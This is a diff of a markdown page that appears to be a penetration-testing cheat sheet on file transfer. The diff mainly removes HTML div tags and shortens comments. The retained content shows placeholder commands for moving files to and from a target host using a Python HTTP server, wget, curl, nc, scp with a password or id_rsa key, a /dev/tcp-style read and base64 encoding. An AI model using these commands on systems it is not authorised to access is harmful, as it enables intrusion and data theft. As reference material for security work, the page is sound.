@@ -11,8 +11,6 @@ tags: ["file transfer", "nc", "scp"]
 {{< tab set1 tab5 >}}Base64{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
 
-<div>
-
 ```console
 # Start a local HTTP server
 python3 -m http.server <LOCAL_PORT>
@@ -28,12 +26,8 @@ wget <LOCAL_IP>:<LOCAL_PORT>/<FILE>
 curl <LOCAL_IP>:<LOCAL_PORT>/<FILE> -o <REMOTE_DEST_PATH>
 ```
 
-</div>
-
 {{< /tabcontent >}}
 {{< tabcontent set1 tab2 >}}
-
-<div>
 
 ```console
 # In our local Linux machine
@@ -45,47 +39,35 @@ nc -lvnp <LOCAL_PORT> < <FILE>
 nc -w3 <LOCAL_IP> <LOCAL_PORT> > <FILE>
 ```
 
-</div>
-
 {{< /tabcontent >}}
 {{< tabcontent set1 tab3 >}}
-
-<div>
 
 #### Remote to Local
 
 ```console
-# If you have target password
+# With password
 scp <USER>@<TARGET>:<REMOTE_FILE_PATH> <LOCAL_DEST_PATH>
 ```
 
 ```console
-# If you have a ssh key
+# With id_rsa
 scp -i id_rsa <USER>@<TARGET>:<REMOTE_FILE_PATH> <LOCAL_DEST_PATH>
 ```
 
-</div>
-
 #### Local to Remote
 
-<div>
-
 ```console
-# If you have target password
+# With password
 scp <LOCAL_FILE_PATH> <USER>@<TARGET>:<REMOTE_DEST_PATH>
 ```
 
 ```console
-# If you have a ssh key
+# With id_rsa
 scp -i id_rsa <LOCAL_FILE_PATH> <USER>@<TARGET>:<REMOTE_DEST_PATH>
 ```
 
-</div>
-
 {{< /tabcontent >}}
 {{< tabcontent set1 tab4 >}}
-
-<div>
 
 #### Local to Remote
 
@@ -109,12 +91,8 @@ cat <&3 > <FILE>
 md5sum <FILE>
 ```
 
-</div>
-
 {{< /tabcontent >}}
 {{< tabcontent set1 tab5 >}}
-
-<div>
 
 #### Small binary
 
@@ -130,8 +108,4 @@ echo -n '<BASE64_FILE>' | base64 -d > <FILE>
 
 <small>*Note: For restricted environment*</small>
 
-</div>
-
 {{< /tabcontent >}}
-
-<br>
